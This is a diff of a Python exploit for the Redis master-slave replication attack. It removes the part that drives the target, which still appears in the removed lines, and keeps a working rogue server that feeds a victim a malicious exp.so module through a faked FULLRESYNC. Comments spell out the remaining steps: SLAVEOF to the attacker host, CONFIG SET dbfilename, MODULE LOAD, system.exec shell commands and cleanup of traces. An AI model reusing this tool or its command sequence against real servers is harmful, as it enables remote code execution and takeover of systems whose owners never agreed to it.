@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
 import socket
-import sys
-from time import sleep
 from optparse import OptionParser
+from time import sleep
 
 payload = open("exp.so", "rb").read()
 CLRF = "\r\n"
+
 
 def mk_cmd_arr(arr):
     cmd = ""
@@ -16,8 +16,10 @@ def mk_cmd_arr(arr):
     cmd += "\r\n"
     return cmd
 
+
 def mk_cmd(raw_cmd):
     return mk_cmd_arr(raw_cmd.split(" "))
+
 
 def din(sock, cnt):
     msg = sock.recv(cnt)
@@ -26,6 +28,7 @@ def din(sock, cnt):
     else:
         print("\033[1;34;40m[->]\033[0m {}......{}".format(msg[:80], msg[-80:]))
     return msg.decode()
+
 
 def dout(sock, msg):
     if type(msg) != bytes:
@@ -36,31 +39,10 @@ def dout(sock, msg):
     else:
         print("\033[1;32;40m[<-]\033[0m {}......{}".format(msg[:80], msg[-80:]))
 
+
 def decode_shell_result(s):
     return "\n".join(s.split("\r\n")[1:-1])
 
-class Remote:
-    def __init__(self, rhost, rport):
-        self._host = rhost
-        self._port = rport
-        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self._sock.connect((self._host, self._port))
-
-    def send(self, msg):
-        dout(self._sock, msg)
-
-    def recv(self, cnt=65535):
-        return din(self._sock, cnt)
-
-    def do(self, cmd):
-        self.send(mk_cmd(cmd))
-        buf = self.recv()
-        return buf
-
-    def shell_cmd(self, cmd):
-        self.send(mk_cmd_arr(['system.exec', "{}".format(cmd)]))
-        buf = self.recv()
-        return buf
 
 class RogueServer:
     def __init__(self, lhost, lport):
@@ -80,7 +62,7 @@ class RogueServer:
             resp = "+OK" + CLRF
             phase = 2
         elif "PSYNC" in data or "SYNC" in data:
-            resp = "+FULLRESYNC " + "Z"*40 + " 1" + CLRF
+            resp = "+FULLRESYNC " + "Z" * 40 + " 1" + CLRF
             # send incorrect length
             resp += "$" + str(len(payload)) + CLRF
             resp = resp.encode()
@@ -99,6 +81,7 @@ class RogueServer:
             if phase == 3:
                 break
 
+
 def interact(remote):
     try:
         while True:
@@ -112,62 +95,39 @@ def interact(remote):
     except KeyboardInterrupt:
         return
 
-def runserver(rhost, rport, lhost, lport, passwd):
-    # expolit
-    remote = Remote(rhost, rport)
 
-    # auth 
-    if passwd:
-        remote.do("AUTH {}".format(passwd))
-    
-    # slave of
-    remote.do("SLAVEOF {} {}".format(lhost, lport))
-
+def runserver(lhost, lport):
     # read original config
-    dbfilename = remote.do("CONFIG GET dbfilename").split(CLRF)[-2]
-    dbdir = remote.do("CONFIG GET dir").split(CLRF)[-2]
+    # CONFIG GET dbfilename
+    # CONFIG GET dir
 
-    # modified to eval config
-    eval_module = "exp.so"
-    eval_dbpath = "{}/{}".format(dbdir, eval_module)
-    remote.do("CONFIG SET dbfilename {}".format(eval_module))
+    # CONFIG SET dbfilename exp.so
 
-    # rend .so to victim
+    # send .so to victim
+
+    # SLAVEOF lhost lport
+
     sleep(2)
     rogue = RogueServer(lhost, lport)
     rogue.exp()
     sleep(2)
 
     # load .so
-    remote.do("MODULE LOAD {}".format(eval_dbpath))
-    remote.do("SLAVEOF NO ONE")
-
-    # Operations here
-    interact(remote)
+    # MODULE LOAD {dbdir}/exp.so
+    # SLAVEOF NO ONE
 
     # clean up
-    # restore original config, delete eval .so
-    remote.do("CONFIG SET dbfilename {}".format(dbfilename))
-    remote.shell_cmd("rm {}".format(eval_dbpath))
-    remote.do("MODULE UNLOAD system")
+    # CONFIG SET dbfilename
+    # MODULE UNLOAD system
+
 
 if __name__ == '__main__':
     parser = OptionParser()
-    parser.add_option("--rhost", dest="rh", type="string",
-            help="target host")
-    parser.add_option("--rport", dest="rp", type="int",
-            help="target redis port, default 6379", default=6379)
     parser.add_option("--lhost", dest="lh", type="string",
-            help="rogue server ip")
+                      help="rogue server ip")
     parser.add_option("--lport", dest="lp", type="int",
-            help="rogue server listen port, default 21000", default=21000)
-    parser.add_option("--passwd", dest="passwd", type="string",
-            help="redis password")
+                      help="rogue server listen port, default 21000", default=21000)
 
     (options, args) = parser.parse_args()
-    if not options.rh or not options.lh:
-        parser.error("Invalid arguments")
-    #runserver("127.0.0.1", 6379, "127.0.0.1", 21000)
-    print("TARGET {}:{}".format(options.rh, options.rp))
     print("SERVER {}:{}".format(options.lh, options.lp))
-    runserver(options.rh, options.rp, options.lh, options.lp, options.passwd)
+    runserver(options.lh, options.lp)
